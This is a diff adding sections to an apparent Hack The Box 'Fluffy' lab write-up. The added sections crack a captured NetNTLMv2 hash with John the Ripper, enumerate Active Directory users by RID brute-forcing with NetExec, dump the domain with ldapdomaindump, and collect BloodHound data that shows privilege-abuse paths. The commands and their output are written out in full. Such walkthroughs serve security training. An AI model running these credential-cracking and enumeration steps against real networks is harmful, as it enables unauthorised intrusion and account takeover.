@@ -125,6 +125,7 @@ The <code>Upgrade_Notice.pdf</code> isn’t just a notice—it’s a vulnerabili
 
 Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
 ```
+### 💥 CVE-2025-24071 Exploitation
 
 <p class="indent-paragraph">
 To exploit <code>CVE-2025-24071</code>, you can use the public PoC at 
@@ -207,7 +208,114 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] User DC01\p.agila authenticated successfully
 [*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000
 ```
+### 🔓 Hash Analysis & Cracking
+
+<p class="indent-paragraph">
+To confirm the exact format of the captured credential blob, we ran it through <code>hashid</code>. The analysis clearly identifies it as <strong>NetNTLMv2</strong>, meaning we’re dealing with a modern NT LMv2 challenge–response hash. This tells us how to configure our cracking tools and ensures we select the correct attack mode for maximum efficiency.
+</p>
+
+```
+~$ hashid "p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000"
+
+Analyzing 'p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000'
+
+[+] NetNTLMv2
+```
+
+<p class="indent-paragraph">
+After running John the Ripper against our <code>hash.txt</code> using the <code>--format=netntlmv2</code> option and the RockYou wordlist, the tool cracked the hash in under a second. It revealed the plaintext password for <code>p.agila</code> as <strong>prometheusx-303</strong>, giving us valid credentials to move forward with authenticated exploits.
+</p>
+
+```
+~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
+
+Created directory: /home/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+~$ prometheusx-303  (p.agila)     
+1g 0:00:00:01 DONE (2025-06-24 15:28) 0.6944g/s 3137Kp/s 3137Kc/s 3137KC/s proquis..programmercomputer
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+<p class="indent-paragraph">
+The next step was to enumerate domain users via RID brute-forcing. <code>nxc</code> (NetExec), a modern and modular successor to CrackMapExec, proved ideal for the task. By leveraging the <code>--rid-brute</code> option, we prompted the domain controller to reveal internal identifiers tied to user accounts. RIDs (Relative Identifiers) are how Active Directory distinguishes users and groups under the hood. Even with low privileges, a properly filtered enumeration can reveal a surprising amount of structure within the environment.
+</p>
+
+```
+~$ nxc smb dc.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}'
+
+Administrator
+Guest
+krbtgt
+DC01$
+ca_svc
+ldap_svc
+p.agila
+winrm_svc
+j.coffey
+j.fleischman
+```
+
+<p class="indent-paragraph">
+With a list of users gathered, the next logical step was to investigate group memberships. Using <code>ldapdomaindump</code><span class="codefix">,</span> we obtained a complete snapshot of the domain including users, groups, and their relationships. The resulting dump provided a clear overview of the environment’s structure and helped identify privileged accounts worth pursuing.
+</p>
+
+```
+~$ ldapdomaindump dc.fluffy.htb -u 'FLUFFY.HTB\p.agila' -p 'prometheusx-303' 
+
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+```
+
+<p class="indent-paragraph">
+After running <code>ldapdomaindump</code><span class="codefix">,</span> we inspected the generated <code>domain_users.html</code> report to map out key accounts within the domain. Besides the expected entries like <code>Administrator</code><span class="codefix">,</span><code>Guest</code><span class="codefix">,</span> and <code>krbtgt</code><span class="codefix">,</span> a few service and user accounts stood out. Notably, <code>p.agila</code> and <code>j.coffey</code> are both members of the <span class="blue">Service Account Managers</span> group — suggesting elevated privileges or operational roles. Other service accounts such as <code>winrm_svc</code><span class="codefix">,</span><code>ldap_svc</code><span class="codefix">,</span> and <code>ca_svc</code> appear embedded within <span class="blue">Service Accounts</span> and related technical groups.
+</p>
+<div style="margin-top: 20px;">
+  <img src="/img/redteam/htb/fluffy/ldap-domain-users.png" alt="LDAP Dump Table" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
+</div>
+
+### 🧾 BloodHound ACL Analysis
+
+<p class="indent-paragraph">
+After mapping out the domain users and their respective groups, the next logical step was to understand the relationships between them. BloodHound is a powerful tool for visualizing Active Directory trust paths and permission structures — and we didn’t want to miss any low-hanging escalation routes. Using the same credentials, we launched<code>bloodhound-python</code> to dump the AD metadata.
+</p>
 
 
+```
+~$ bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -dc dc01.fluffy.htb -c All -ns <IP> 
+
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+INFO: Done in 00M 26S
+```
+
+<p class="indent-paragraph">
+To assess the current privileges and potential escalation paths for our session, we analyzed the imported data in <code>BloodHound</code>. Using a general relationship query<code> MATCH (n)-[r]->(m) RETURN n, r, m</code><span class="codefix">,</span> we visualized a clear graph centered around <code>p.agila@FLUFFY.HTB</code>. The user holds multiple powerful edges, including <code>GenericAll</code> and <code>AddKeyCredentialLink</code> over several objects, suggesting direct abuse potential. Additionally, their membership in the <span class="blue">Service Account Managers</span> group, alongside nested privilege chains through <code>SERVICE ACCOUNTS@FLUFFY.HTB</code>, provides expanded influence over remote access and group policy-linked systems. This graph highlights promising attack paths involving <code>GenericWrite</code>, <code>CanPSRemote</code>, and even <code>GetChangesAll</code> over the domain object itself.
+</p>
+
+<p class="indent-paragraph">
+  <img src="/img/redteam/htb/fluffy/graph_pagila_fluffy_htb.png" alt="BloodHound graph for levi.james" style="width:100%; border-radius:6px; margin-top: 1em;" />
+</p>
 
 
